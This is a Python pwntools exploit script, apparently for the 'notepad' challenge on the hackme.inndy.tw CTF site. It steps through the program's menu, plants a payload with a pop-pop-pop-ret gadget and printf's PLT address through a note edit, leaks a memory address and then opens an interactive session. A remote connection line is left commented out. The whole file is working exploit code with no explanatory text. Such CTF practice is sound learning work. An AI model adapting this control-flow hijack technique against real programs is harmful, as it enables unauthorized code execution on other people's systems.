#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

def debug(addr = '0x8048ce8'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

def base_addr(prog_addr,offset):
    return eval(prog_addr)-offset

elf = ELF('/home/h11p/hackme/notepad')
printf_addr=elf.plt['printf']
print 'printf_addr:'+hex(printf_addr)

io = process('/home/h11p/hackme/notepad')

#io = remote('hackme.inndy.tw', 7713)
pop_pop_pop_ret=0x08049109

payload='a'*8+p32(pop_pop_pop_ret)+'a'*3

debug()
io.recvuntil('::> ')
io.sendline('c')
io.recvuntil('::>')
io.sendline('a')
io.recvuntil('size > ')
io.sendline('16')
io.recvuntil('data > ')
io.send(payload)

io.recvuntil('::> ')
io.sendline('a')
io.recvuntil('size > ')
io.sendline('16')
io.recvuntil('data > ')
io.send('a'*15)

io.recvuntil('::> ')
io.sendline('b')
io.recvuntil('id > ')
io.sendline('1')
io.recvuntil('edit (Y/n)')
io.sendline(p32(0x59))
io.recvuntil('content > ')
io.sendline('b'*8+p32(printf_addr))
io.recvuntil('::> ')
io.sendline(p32(93))
malloc_addr=io.recv()
print malloc_addr
io.interactive()
io.close()

